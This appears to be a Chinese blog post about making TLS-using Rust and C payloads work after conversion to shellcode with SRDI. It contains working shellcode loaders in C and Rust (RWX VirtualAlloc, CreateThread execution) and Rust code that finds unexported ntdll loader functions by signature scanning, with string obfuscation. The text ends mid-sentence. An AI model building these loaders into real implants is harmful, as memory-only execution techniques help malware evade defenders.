<code>msvc</code> \u7248\u672c\u7684 <code>hello world</code> \u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff0c \u867d\u7136\u6211\u4eec\u8c03\u7528\u4e86 <code>callback</code>\uff0c \u4f46\u5f88\u663e\u7136\uff0c \u8be5<code>callback</code> \u53ea\u7528\u4e8e\u6790\u6784\u51fd\u6570</p> <p>\u800c\u6211\u4eec\u7684 <code>hello world</code> \u4e2d\u5927\u91cf\u5f15\u7528\u4e86 <code>tls_index</code>\uff0c \u56e0\u6b64\u5728\u5176\u5c1d\u8bd5\u83b7\u53d6 <code>TEB</code> \u8868\u540e\u901a\u8fc7 <code>tls_index</code> \u6765\u505a\u7684\u4efb\u4f55\u64cd\u4f5c\u90fd\u5c06\u5931\u6548\uff0c \u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9\u5176\u505a\u4efb\u4f55\u64cd\u4f5c</p> <p>\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u5728\u4e24\u79cd\u573a\u666f\u4e0b\u8fdb\u884cdemo\u7684\u6d4b\u8bd5\uff0c \u9996\u5148\u662f\u7eaf <code>c</code> \u73af\u5883\u4e2d\uff0c \u7528\u5e38\u7528\u7684 <code>SRDI</code> \u5c06\u6211\u4eec\u7684 <code>hello world</code> \u8f6c\u5316\u4e3a <code>shellcode</code> \u8fdb\u884c\u52a0\u8f7d</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\n#define SHELLCODE_SIZE 1024\n\nint main() {\n    FILE *file = fopen(\"shellcode.bin\", \"rb\");\n    if (!file) {\n        perror(\"\u6253\u5f00\u6587\u4ef6\u5931\u8d25\");\n        return -1;\n    }\n\n    unsigned char shellcode[SHELLCODE_SIZE];\n    size_t bytesRead = fread(shellcode, 1, SHELLCODE_SIZE, file);\n    fclose(file);\n\n    void *exec = VirtualAlloc(0, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (exec == NULL) {\n        perror(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\");\n        return -1;\n    }\n\n    memcpy(exec, shellcode, bytesRead);\n\n    ((void(*)())exec)();\n\n    VirtualFree(exec, 0, MEM_RELEASE);\n    return 0;\n}\n</code></pre> <p>\u6267\u884c\u4e00\u4e0b</p> <pre><code>fatal runtime error: global allocator may not use TLS\n</code></pre> <p>\u8be5\u9519\u8bef\u6765\u81ea\u4e8e</p> <pre><code>// https://github.com/rust-lang/rust/blob/master/library/std/src/sys/thread_local/destructors/list.rs\npub unsafe fn register(t: *mut u8, dtor: unsafe extern \"C\" fn(*mut u8)) {\n    let Ok(mut dtors) = DTORS.try_borrow_mut() else {\n        // This point can only be reached if the global allocator calls this\n        // function again.\n        // FIXME: maybe use the system allocator instead?\n        rtabort!(\"the global allocator may not use TLS with destructors\");\n    };\n\n    guard::enable();\n\n    dtors.push((t, dtor));\n}\n</code></pre> <p>\u6682\u65f6\u6309\u4e0b\u4e0d\u8868\uff0c \u63a5\u4e0b\u6765\u662f <code>rust</code> \u73af\u5883</p> <pre><code>use std::fs::File;\nuse std::io::{self, Read};\nuse std::mem;\nuse std::ptr;\nuse std::os::windows::ffi::OsStrExt;\nuse winapi::um::memoryapi::VirtualAlloc;\nuse winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};\n\nfn main() -&gt; io::Result&lt;()&gt; {\n    let mut file = File::open(\"shellcode.bin\")?;\n    let mut shellcode = Vec::new();\n\n    file.read_to_end(&amp;mut shellcode)?;\n\n    let exec = unsafe {\n        VirtualAlloc(\n            ptr::null_mut(),\n            shellcode.len(),\n            MEM_COMMIT | MEM_RESERVE,\n            PAGE_EXECUTE_READWRITE,\n        )\n    };\n\n    if exec.is_null() {\n        eprintln!(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\");\n        return Err(io::Error::new(io::ErrorKind::Other, \"\u5185\u5b58\u5206\u914d\u5931\u8d25\"));\n    }\n\n    unsafe {\n        ptr::copy_nonoverlapping(shellcode.as_ptr(), exec as *mut u8, shellcode.len());\n        let func: fn() = mem::transmute(exec);\n        func();\n    }\n\n    Ok(())\n}\n</code></pre> <p>\u6267\u884c\u4e00\u4e0b</p> <pre><code>.\\loader_demo.exe\nfatal runtime error: thread::set_current should only be called once per thread\n</code></pre> <p>\u62a5\u9519\u5f88\u660e\u663e\uff0c <code>rust</code> \u7684\u7ebf\u7a0b\u521d\u59cb\u5316\u51fd\u6570\u53ea\u80fd\u88ab\u8c03\u7528\u4e00\u6b21\uff0c \u800c\u6211\u4eec\u6267\u884c\u65f6\u7684\u4e3b\u7ebf\u7a0b\u5728\u521b\u5efa\u65f6\u5df2\u7ecf\u88ab<code>call</code>\u8fc7\u4e00\u6b21\u4e86\uff0c \u56e0\u6b64\u6211\u4eec\u7528<code>create_thread</code> \u6765\u6267\u884c\u4e00\u4e0b</p> <pre><code>use std::fs::File;\nuse std::io::{self, Read};\nuse std::mem;\nuse std::ptr;\nuse std::os::windows::ffi::OsStrExt;\nuse winapi::um::memoryapi::VirtualAlloc;\nuse winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, HANDLE};\nuse winapi::um::processthreadsapi::CreateThread;\nuse winapi::um::synchapi::WaitForSingleObject;\n\nunsafe extern \"system\" fn thread_func(param: *mut winapi::ctypes::c_void) -&gt; u32 {\n    let shellcode = param as *const u8;\n    let func: fn() = mem::transmute(shellcode);\n    func();\n\n    0\n}\n\nfn main() -&gt; io::Result&lt;()&gt; {\n    println!(\"[+] will run!\");\n    let mut file = File::open(\"shellcode.bin\")?;\n    let mut shellcode = Vec::new();\n\n    file.read_to_end(&amp;mut shellcode)?;\n\n    let exec = unsafe {\n        VirtualAlloc(\n            ptr::null_mut(),\n            shellcode.len(),\n            MEM_COMMIT | MEM_RESERVE,\n            PAGE_EXECUTE_READWRITE,\n        )\n    };\n\n    if exec.is_null() {\n        eprintln!(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\");\n        return Err(io::Error::new(io::ErrorKind::Other, \"\u5185\u5b58\u5206\u914d\u5931\u8d25\"));\n    }\n\n    unsafe {\n        ptr::copy_nonoverlapping(shellcode.as_ptr(), exec as *mut u8, shellcode.len());\n        let thread_handle: HANDLE = CreateThread(\n            ptr::null_mut(),\n            0,\n            Some(thread_func),\n            exec,\n            0,\n            ptr::null_mut(),\n        );\n\n        if thread_handle.is_null() {\n            eprintln!(\"\u521b\u5efa\u7ebf\u7a0b\u5931\u8d25\");\n            return Err(io::Error::new(io::ErrorKind::Other, \"\u521b\u5efa\u7ebf\u7a0b\u5931\u8d25\"));\n        }\n        WaitForSingleObject(thread_handle, 0xffffffff);\n    }\n\n    println!(\"[+] run over~\");\n\n    Ok(())\n}\n</code></pre> <p>\u73b0\u5728\u6267\u884c</p> <pre><code>.\\loader_demo.exe\n[+] will run!\nHello, world!\n</code></pre> <p>\u6210\u529f\u4e86\uff0c \u8bf4\u660e\u5728\u6709 <code>TLS</code> \u7684\u60c5\u51b5\u4e0b\uff0c\u5728\u76f8\u540c\u7f16\u8bd1\u5668\u7248\u672c\u4e0b\uff0c \u7b80\u5355\u7684 <code>hello world</code> \u7a0b\u5e8f\u662f\u53ef\u4ee5\u9519\u8bef\u7684\u6b63\u786e\u6267\u884c\u7684\uff08\u6ca1\u6709\u8f93\u51fa <code>run over~</code>\u662f\u56e0\u4e3a <code>hello world</code> \u8c03\u7528\u4e86 <code>exit</code>)</p> <p>\u73b0\u5728\u6211\u4eec\u6210\u529f\u7684\u52a0\u8f7d\u4e86 <code>hello world</code>, \u4f46\u5176\u5b9e\u5e76\u6ca1\u6709\u89e3\u51b3\u6839\u672c\u95ee\u9898\uff0c \u6bd4\u5982\u7eaf<code>c</code>\u73af\u5883\u6216\u590d\u6742\u7684 <code>rust</code>\u7a0b\u5e8f\uff0c \u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5728\u7eaf <code>c</code> \u73af\u5883\u4e2d\u52a0\u8f7d <code>hello world</code></p> <p>\u9996\u5148\u6211\u4eec\u56de\u5230 <code>c</code> \u7684\u62a5\u9519</p> <pre><code>fatal runtime error: global allocator may not use TLS\n</code></pre> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u77e5\u9053\u7684\u662f\uff0c \u6211\u4eec\u7684 <code>tls callback</code> \u51fd\u6570\u5e76\u4e0d\u4f1a\u505a\u4efb\u4f55\u7684 <code>tls</code> \u521d\u59cb\u5316\u76f8\u5173\u5de5\u4f5c\uff0c \u6211\u4eec\u9700\u8981\u5728\u5176\u5b83\u5730\u65b9\u5bfb\u627e\u5176\u8e2a\u8ff9\uff0c \u6211\u4eec\u6f0f\u4e86\u4ec0\u4e48\u5462?</p> <p>\u6b64\u65f6\u6211\u60f3\u8d77\u4e4b\u524d\u770b\u5230\u7684\u4e00\u4e2a\u9879\u76ee WID_LoadLibrary , \u53ef\u4ee5\u8ba9\u6211\u4eec\u5f88\u597d\u7684\u770b\u6e05 <code>LoadLibrary</code>\u7684\u5177\u4f53\u6d41\u7a0b\uff08\u5f53\u7136\uff0c \u7531\u4e8e\u63d0\u4f9b\u4e86\u7b26\u53f7\u8868\uff0c \u5982\u679c\u53ea\u5173\u5fc3\u6d41\u7a0b\u7684\u8bdd\u76f4\u63a5\u770b<code>ntdll</code> \u4e5f\u5dee\u4e0d\u591a\uff09\uff0c\u5982\u679c\u53ea\u770b\u8be5\u9879\u76ee\u7684\u5206\u6790\uff0c \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06\u5173\u6ce8\u70b9\u6536\u7f29\u5230\u5173\u952e\u51fd\u6570 <code>LdrpCallTlsInitializers</code></p> <p>\u8fd9\u91cc\u6211\u4ee5\u6211\u672c\u673a\u73af\u5883\u4e3a\u4f8b</p> <pre><code>&gt;ver\nMicrosoft Windows [\u7248\u672c 10.0.22631.4460]\n</code></pre> <p>\u770b\u770b64\u4f4d\u8be5\u51fd\u6570\u7684\u4f5c\u7528</p> <pre><code>__int64 __fastcall LdrpCallTlsInitializers(unsigned int a1, __int64 a2)\n{\n  __int64 TlsEntry; // rbx\n  __int64 result; // rax\n  __int64 *v6; // rbx\n  __int64 v7; // rdi\n\n  RtlAcquireSRWLockShared(&amp;LdrpTlsLock);\n  TlsEntry = LdrpFindTlsEntry(a2);\n  result = RtlReleaseSRWLockShared(&amp;LdrpTlsLock);\n  if ( TlsEntry )\n  {\n    v6 = *(__int64 **)(TlsEntry + 40);\n    if ( v6 )\n    {\n      while ( 1 )\n      {\n        v7 = *v6;\n        if ( !*v6 )\n          break;\n        ++v6;\n        LdrpLogInternal(\n          (unsigned int)\"minkernel\\\\ntdll\\\\ldrtls.c\",\n          1180,\n          (unsigned int)\"LdrpCallTlsInitializers\",\n          2,\n          \"Calling TLS callback %p for DLL \\\"%wZ\\\" at %p\\n\",\n          v7,\n          a2 + 72,\n          *(_QWORD *)(a2 + 48));\n        result = LdrpCallInitRoutine(ImageTlsCallbackCaller, *(_QWORD *)(a2 + 48), a1, v7);\n      }\n    }\n  }\n  return result;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c \u8be5\u51fd\u6570\u5728\u672c\u7248\u672c\u4e2d\u7684\u8c03\u7528\u5341\u5206\u6e05\u6670\uff0c\u901a\u8fc7\u8c03\u7528<code>LdrpFindTlsEntry</code> \u51fd\u6570\u83b7\u53d6  <code>TlsEntry</code>\uff0c \u968f\u540e\u904d\u5386\u5bfb\u627e\u5176 <code>Tls callback</code>\u51fd\u6570\u5e76\u8c03\u7528</p> <p>\u800c\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\u8fd8\u6709\u4e00\u90e8\u5206\u5185\u5bb9\u65e9\u5c31\u521d\u59cb\u5316\u597d\u4e86\uff0c\u800c\u9879\u76ee\u4e2d\u5e76\u672a\u63d0\u53ca\uff0c \u56e0\u6b64\u6211\u4eec\u8fd8\u662f\u9700\u8981\u4f9d\u8d56 <code>ntdll</code>\uff0c \u611f\u8c22\u5fae\u8f6f\u5bf9\u7b26\u53f7\u8868\u7684\u6177\u6168:)</p> <p>\u5f53\u6211\u4eec\u641c\u7d22 <code>ntdll</code>\u4e2d\u548c<code>tls</code>\u76f8\u5173\u7684\u51fd\u6570\u65f6\uff0c \u53ef\u4ee5\u6ce8\u610f\u5230\u51e0\u4e2a\u4e4b\u524d\u4ece\u672a\u63d0\u53ca\u7684\u51fd\u6570<code>LdrpInitializeTls</code>, <code>LdrpHandleTlsData</code> \u4ee5\u53ca <code>LdrpAllocateTlsEntry</code></p> <p><code>LdrpInitializeTls</code> \u51fd\u6570\u88ab <code>LdrpInitializeProcess</code> \u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\u5176\u5b9e\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u5c31\u5df2\u7ecf\u521d\u59cb\u5316\u8fc7<code>TLS</code>\u4e86\uff0c \u6211\u4eec\u540e\u7eed <code>SRDI</code> \u51fa\u6765\u7684 <code>shellcode</code>  \u5b8c\u5168\u6240\u4f7f\u7528\u7684<code>tls_index</code>\u4e0e\u4e4b\u5b8c\u5168\u65e0\u5173\uff0c \u5373\u4f7f\u50cf\u4e4b\u524d <code>hello world</code> \u5728 <code>rust</code> \u73af\u5883\u4e2d\u9519\u8bef\u7684\u6b63\u786e\u6267\u884c\u4e86\uff0c \u4e5f\u662f\u56e0\u4e3a\u6211\u4eec\u9519\u8bef\u8986\u76d6\u6216\u4f7f\u7528\u4e86\u539f\u672c<code>rust</code>\u7a0b\u5e8f\u7684<code>tls</code>\u73af\u5883</p> <p>\u63a5\u4e0b\u6765 <code>LdrpHandleTlsData</code> \u8ffd\u6839\u6eaf\u6e90\u5219\u6765\u81ea\u4e8e <code>LdrLoadDll</code>\uff0c \u597d\u7684\uff0c \u8fd9\u5e94\u8be5\u5c31\u662f\u6211\u4eec\u9700\u8981\u91cd\u70b9\u5173\u6ce8\u7684\u5185\u5bb9\u4e86</p> <p>\u7531\u4e8e\u6211\u4eec\u7684\u7eaf <code>c</code> \u73af\u5883\u5e76\u6ca1\u6709\u9690\u5f0f <code>tls</code>\uff0c \u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316\u548c\u5206\u914d\uff0c \u90a3\u4e48\u63a5\u4e0b\u6765\u9700\u8981\u505a\u7684\uff0c \u5c31\u6e05\u6670\u660e\u6717\u4e86\u8bb8\u591a</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u5173\u6ce8<code>LdrpInitializeTls</code>\u5417\uff0c \u5176\u5b9e\u5e76\u4e0d\u9700\u8981\uff0c \u56e0\u4e3a\u60f3\u8c61\u6b63\u5e38\u7cfb\u7edf <code>load dll</code> \u7684\u573a\u666f\uff0c \u4e00\u4e2a\u542b\u6709\u9690\u5f0f <code>tls</code> \u7684 <code>dll</code> \u5728\u4f7f\u7528 <code>LoadLibrary</code> \u88ab\u52a0\u8f7d\u8fdb\u7cfb\u7edf\u65f6\u662f\u4e0d\u4f1a\u89e6\u53d1\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\uff0c \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5173\u6ce8\u5728 <code>LdrLoadDll</code> \u65f6\u8c03\u7528\u7684<code>LdrpHandleTlsData</code>\u5373\u53ef\uff0c \u800c\u8be5\u51fd\u6570\u7b7e\u540d\u5982\u4e0b:</p> <pre><code>pub type LdrpHandleTlsData = unsafe extern \"system\" fn(\n    hmodule: *mut ::core::ffi::c_void,\n) -&gt; i32;\n</code></pre> <p>\u56e0\u6b64\u60f3\u8981\u89e3\u51b3\u6211\u4eec\u7684\u95ee\u9898\uff0c \u6709\u4e24\u6761\u8def\u7ebf\u6446\u5728\u6211\u4eec\u9762\u524d: 1. \u5c1d\u8bd5\u8c03\u7528\u8be5\u51fd\u6570 2. \u5c1d\u8bd5\u5b9e\u73b0\u8be5\u51fd\u6570</p> <p>\u7531\u4e8e <code>LdrpHandleTlsData</code> \u51fd\u6570\u672a\u5bfc\u51fa\uff0c \u56e0\u6b64\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u83b7\u53d6\u5230\u8be5\u51fd\u6570\u7684\u5730\u5740\u5e76\u8c03\u7528\uff0c \u8fd9\u4e5f\u662f\u5f00\u5934\u63d0\u53ca\u7684\u6587\u7ae0Writing a PE Loader for the Xbox in 2024 \u6240\u5b8c\u6210\u7684\u90a3\u6837\uff0c \u800c\u7531\u4e8e <code>windows</code> \u7248\u672c\u975e\u5e38\u591a\uff0c \u56e0\u6b64\u8fdc\u8fdc\u4e0d\u591f\uff0c \u4f46\u8fd8\u662f\u6709\u4e00\u4e9b\u9879\u76ee\u505a\u4e86\u5927\u91cf\u7684\u9002\u914d\uff0c \u4f8b\u5982 Blackbone \u8fd8\u6709 MemoryModulePP</p> <p>\u8fd9\u51e0\u4e2a\u9879\u76ee\u90fd\u4f7f\u7528\u4e86\u901a\u8fc7\u786c\u7f16\u7801\u7279\u5f81\u6765\u8fdb\u884c\u5185\u5b58\u641c\u7d22\u7684\u529e\u6cd5\uff0c \u4f46\u524d\u4eba\u7684\u5de5\u4f5c\u4eff\u4f5b\u505c\u5728\u4e86 <code>Win11</code> \u7248\u672c\u4e4b\u524d\uff0c\u800c<code>Win11</code>\u4e5f\u5df2\u7ecf\u63a8\u51fa <code>3</code> \u5e74\u4e86\uff0c \u9700\u8981\u53bb\u4e00\u4e00\u9002\u914d\u5417</p> <p>\u5982\u679c\u5404\u4f4d\u7ecf\u5e38\u5199<code>exp</code>\u7684\u8bdd\uff0c \u5e94\u8be5\u4f1a\u7ecf\u5e38\u9047\u5230\u9700\u8981\u5bfb\u627e\u5168\u5c40\u53d8\u91cf\u6216\u67d0\u4e9b\u51fd\u6570\u7684\u9700\u6c42\uff0c \u6bd4\u5982 <code>chrome</code> \u8fc7\u6c99\u7bb1\u9700\u8981\u8bbe\u7f6e\u7684\u67d0<code>flag</code>\uff0c \u867d\u7136\u6253\u5f00<code>ida</code> \u5f88\u5feb\u5c31\u80fd\u505a\u597d\u9002\u914d\uff0c \u4f46\u591a\u4e2a\u7248\u672c\u8fd8\u662f\u9700\u8981\u627e\u4e00\u4e2a\u5171\u6027</p> <p>\u597d\u5728 <code>win11</code> \u7ed9\u4e86\u6211\u4eec\u4fbf\u5229\uff0c \u8ba9\u6211\u4eec\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u51e0\u4e2a\u51fd\u6570\uff0c \u53ef\u4ee5\u6ce8\u610f\u5230\u521a\u521a\u6211\u7ed9\u51fa\u7684\u7247\u6bb5\u4e2d\u6709\u7528\u4e8e <code>debug</code> \u7684\u65e5\u5fd7\u4fe1\u606f\uff0c \u90a3\u4e48\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u901a\u8fc7<code>debug</code>\u4fe1\u606f\u5b9a\u4f4d\u51fd\u6570\u5462\uff0c \u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6ce8\u610f\u5230\u5728<code>LdrpInitializeTls</code> \u51fd\u6570\u4e2d\u7684\u4e00\u4e2a\u7247\u6bb5(\u4ee564\u4f4d\u4e3e\u4f8b)</p> <pre><code>// ntdll version: 10.0.22000.120\n.text:0000000180079CFD loc_180079CFD:                          ; CODE XREF: LdrpInitializeTls+D3\u2191j\n.text:0000000180079CFD                 lea     rax, [rsi+48h]\n.text:0000000180079D01                 mov     [rsp+88h+var_58], rbp\n.text:0000000180079D06                 mov     [rsp+88h+var_60], rax\n.text:0000000180079D0B                 lea     r8, aLdrpinitialize_5 ; \"LdrpInitializeTls\"\n.text:0000000180079D12                 lea     rax, aDllWzHasTlsInf ; \"DLL \\\"%wZ\\\" has TLS information at %p\\n\"\n.text:0000000180079D19                 mov     r9d, 2\n.text:0000000180079D1F                 mov     edx, 281h\n.text:0000000180079D24                 mov     [rsp+88h+var_68], rax\n.text:0000000180079D29                 lea     rcx, aMinkernelNtdll_2 ; \"minkernel\\\\ntdll\\\\ldrtls.c\"\n.text:0000000180079D30                 call    LdrpLogInternal\n.text:0000000180079D35                 xor     r9d, r9d\n.text:0000000180079D38                 mov     [rsp+88h+var_68], r14\n.text:0000000180079D3D                 lea     r8, [rsp+88h+var_48]\n.text:0000000180079D42                 mov     rdx, rsi\n.text:0000000180079D45                 mov     rcx, rbp\n.text:0000000180079D48                 call    LdrpAllocateTlsEntry\n.text:0000000180079D4D                 test    eax, eax\n.text:0000000180079D4F                 js      short loc_180079CD5\n.text:0000000180079D51                 mov     eax, 0FFFFh\n.text:0000000180079D56                 mov     [rsi+6Eh], ax\n.text:0000000180079D5A                 jmp     loc_180079CB1\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c \u5728\u8be5\u7248\u672c\u4e2d\uff0c \u53ea\u8981\u627e\u5230 <code>LdrpInitializeTls</code> \u7684\u5f15\u7528\uff0c \u5c31\u80fd\u627e\u5230\u8be5\u7247\u6bb5\u7684\u4e0a\u4e0b\u6587\uff0c \u800c\u518d\u89c2\u5bdf\u4e00\u4e0b\u9644\u8fd1\u7684\u4fe1\u606f <code>LdrpAllocateTlsEntry</code>,  \u53ea\u4f1a\u5728\u4e24\u4e2a\u51fd\u6570\u4e2d\u88ab\u5f15\u7528</p> <pre><code>Direction   Type    Address Text\nUp  p   LdrpHandleTlsData+124   call    LdrpAllocateTlsEntry\n    p   LdrpInitializeTls+16C   call    LdrpAllocateTlsEntry\nDown    o   .rdata:0000000180152E08 RUNTIME_FUNCTION &lt;rva LdrpAllocateTlsEntry, rva byte_180031153, \\\nDown    o   .pdata:000000018017F728 RUNTIME_FUNCTION &lt;rva LdrpAllocateTlsEntry, rva byte_180031153, \\\n</code></pre> <p>\u800c <code>LdrpHandleTlsData</code> \u6070\u5de7\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c \u518d\u770b\u770b<code>LdrpHandleTlsData</code>\u51fd\u6570</p> <pre><code>.text:0000000180033824 LdrpHandleTlsData proc near             ; CODE XREF: LdrpDoPostSnapWork+6F\u2193p\n.text:0000000180033824                                         ; DATA XREF: .rdata:00000001801530F0\u2193o ...\n.text:0000000180033824\n...\n.text:0000000180033945                 mov     rcx, r14\n.text:0000000180033948                 call    LdrpAllocateTlsEntry\n.text:000000018003394D                 mov     esi, eax\n.text:000000018003394F                 mov     [rsp+108h+var_D4], eax\n</code></pre> <p>\u5f88\u597d\uff0c \u53ea\u9700\u8981\u6211\u4eec\u901a\u8fc7 <code>debug</code> \u5b57\u7b26\u4e32\u7279\u5f81\u53cd\u67e5\u5230 <code>call LdrpAllocateTlsEntry</code> \u7684\u5730\u65b9\uff0c \u518d\u901a\u8fc7\u626b\u63cf<code>.text</code> \u6bb5\u4e2d\u5bf9\u8be5\u5730\u5740\u7684 <code>call rva</code> \u7684 <code>opcode</code>\uff0c \u626b\u63cf\u5230\u51fd\u6570\u5f00\u5934\u5c31\u80fd\u627e\u5230<code>LdrpHandleTlsData</code>\u4e86\uff0c \u800c\u7531\u4e8e\u5bf9\u9f50\u7684\u539f\u56e0\uff0c \u51fd\u6570\u5f00\u5934\u524d\u9762\u4f1a\u6709 <code>CC CC CC</code>\u7c7b\u7684\u586b\u5145\uff0c \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u4e8b\u60c5\u5c31\u975e\u5e38\u5bb9\u6613\u4e86</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#done","title":"done!","text":"<pre><code>pub unsafe fn find_ldrp_handle_tls_data() -&gt; usize {\n    let ntdll = match GetModuleBaseAddr(\n        obfstr!(\"ntdll.dll\").as_bytes(), \n        StrCmp::u16_u8_cmp\n    ) {\n        Ok(addr) =&gt; addr,\n        Err(_) =&gt; 0 as _\n    }; \n    let s = \"LdrpInitializeTls\\x00\".as_bytes();\n    let pe = match crate::pe::PE::PE::new_unchecked(ntdll) {\n        Some(pe) =&gt; pe,\n        None =&gt; return 0\n    };\n    let s_addr = match pe.find_string_in_rdata(s) {\n        Some(addr) =&gt; addr,\n        None =&gt; return 0\n    };\n    println!(\"[+] s_addr is {:x}\", s_addr);\n    let xref_addr = match pe.find_xref_in_text(b\"\\x4C\\x8d\\x05\", 7, s_addr) {\n        Some(addr) =&gt; addr + ntdll as usize,\n        None =&gt; return 0\n    };\n    println!(\"xref_addr is {:x}\", xref_addr);\n    let call_drp_log_internal_addr = \n        match find_str(xref_addr as _, 0x30, b\"\\xE8\") {\n            Some(addr) =&gt; addr + xref_addr,\n            None =&gt; return 0\n    };\n    println!(\"[+] call_drp_log_internal_addr is {:x}\"\n        , call_drp_log_internal_addr);\n    let call_ldr_allocate_tls_entry = match find_str(\n            (call_drp_log_internal_addr + 5) as _, \n            0x30, \n            b\"\\xE8\") {\n        Some(addr) =&gt; addr + call_drp_log_internal_addr + 5,\n        None =&gt; return 0\n    };\n    println!(\"[+] call_ldr_allocate_tls_entry is {:x}\", \n        call_ldr_allocate_tls_entry);\n    let ldr_allocate_tls_entry = call_ldr_allocate_tls_entry + \n        calc_call_rva(call_ldr_allocate_tls_entry as _) as usize;\n    let black_list: [usize;1] = [call_ldr_allocate_tls_entry];\n    let call_ldr_allocate_tls_entry2 = \n        match pe.find_call_rva_in_text(ldr_allocate_tls_entry, &amp;black_list) {\n            Some(addr) =&gt; addr,\n            None =&gt; { return 0; }\n    };\n    println!(\"[+] call_ldr_allocate_tls_entry2 is {:x}\", \n        call_ldr_allocate_tls_entry2);\n    let ldrp_handle_tls_data = \n        match pe.find_func_start(call_ldr_allocate_tls_entry2) {\n            Some(addr) =&gt; addr,\n            None =&gt; return 0\n    };\n    println!(\"[+] ldrp handle tls data is {:x}\", ldrp_handle_tls_data);\n    return ldrp_handle_tls_data;\n}\n</code></pre> <p>\u518d\u770b\u770b\u6d4b\u8bd5\u673a\u7684\u7248\u672c<code>10.0.22631.4602</code>\uff0c \u4e5f\u4e00\u6837\u53ef\u4ee5\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u5bfb\u627e\uff0c \u90a3\u4e48\u662f\u5426\u53ef\u4ee5\u66ff\u6362\u524d\u9762\u7684\u90a3\u4e00\u5927\u7968\u5185\u5bb9\u5462</p> <p>\u5f88\u53ef\u60dc\uff0c \u6211\u5148\u662f\u4fe1\u5fc3\u6ee1\u6ee1\u7684\u4e0b\u8f7d\u4e86\u6d4b\u8bd5\u673a <code>win7(ver: 6.1.7600)</code> \u7684 <code>ntdll</code>\uff0c </p> <pre><code>.text:0000000078EF09D0 loc_78EF09D0:                           ; CODE XREF: LdrpInitializeTls+99\u2191j\n.text:0000000078EF09D0                                         ; DATA XREF: .pdata:0000000078F9E1BC\u2193o\n.text:0000000078EF09D0                 mov     rsi, [rsp+88h+Src]\n.text:0000000078EF09D8                 test    rsi, rsi\n.text:0000000078EF09DB                 jz      loc_78E994A7\n.text:0000000078EF09E1                 test    byte ptr cs:LdrpDebugFlags, 5\n.text:0000000078EF09E8                 jz      short loc_78EF0A1B\n.text:0000000078EF09EA                 lea     rax, [rdi+48h]\n.text:0000000078EF09EE                 mov     [rsp+88h+var_58], rsi\n.text:0000000078EF09F3                 lea     r8, aLdrpinitialize_1 ; \"LdrpInitializeTls\"\n.text:0000000078EF09FA                 mov     [rsp+88h+var_60], rax\n.text:0000000078EF09FF                 lea     rcx, aDW7rtmMinkerne_15 ; \"d:\\\\w7rtm\\\\minkernel\\\\ntdll\\\\ldrtls.c\"\n.text:0000000078EF0A06                 mov     r9d, 2\n.text:0000000078EF0A0C                 mov     edx, 23Fh\n.text:0000000078EF0A11                 mov     [rsp+88h+var_68], r15\n.text:0000000078EF0A16                 call    LdrpLogDbgPrint\n.text:0000000078EF0A1B\n.text:0000000078EF0A1B loc_78EF0A1B:                           ; CODE XREF: LdrpInitializeTls+575E8\u2191j\n.text:0000000078EF0A1B                 test    bpl, bpl\n.text:0000000078EF0A1E                 jz      short loc_78EF0A21\n.text:0000000078EF0A20                 int     3               ; Trap to Debugger\n.text:0000000078EF0A21\n.text:0000000078EF0A21 loc_78EF0A21:                           ; CODE XREF: LdrpInitializeTls+5761E\u2191j\n.text:0000000078EF0A21                 lea     r8, [rsp+88h+arg_0]\n.text:0000000078EF0A29                 xor     r9d, r9d\n.text:0000000078EF0A2C                 mov     rdx, rdi\n.text:0000000078EF0A2F                 mov     rcx, rsi        ; Src\n.text:0000000078EF0A32                 mov     [rsp+88h+var_68], rbp ; __int64\n.text:0000000078EF0A37                 call    LdrpAllocateTlsEntry\n.text:0000000078EF0A3C                 test    eax, eax\n.text:0000000078EF0A3E                 js      loc_78E994CD\n.text:0000000078EF0A44                 mov     [rdi+6Eh], r14w\n.text:0000000078EF0A49                 jmp     loc_78E994A7\n.text:0000000078EF0A4E ; ---------------------------------------------------------------------------\n</code></pre> <p>\u5f88\u597d\uff0c \u518d\u770b\u770b <code>LdrpHandleTlsData</code></p> <pre><code>.text:0000000078E8D030 ; __unwind { // __C_specific_handler\n...\n.text:0000000078E8D07C                 jns     loc_78EF1CC6\n.text:0000000078E8D082\n.text:0000000078E8D082 loc_78E8D082:                           ; CODE XREF: LdrpHandleTlsData+64C9C\u2193j\n.text:0000000078E8D082                 xor     eax, eax\n.text:0000000078E8D084\n...\n.text:0000000078E8D096                 retn\n.text:0000000078E8D096 ; ---------------------------------------------------------------------------\n.text:0000000078E8D097                 align 20h\n.text:0000000078E8D097 ; } // starts at 78E8D030\n.text:0000000078E8D097 LdrpHandleTlsData endp\n</code></pre> <p>\u5b8c\u4e86\uff0c 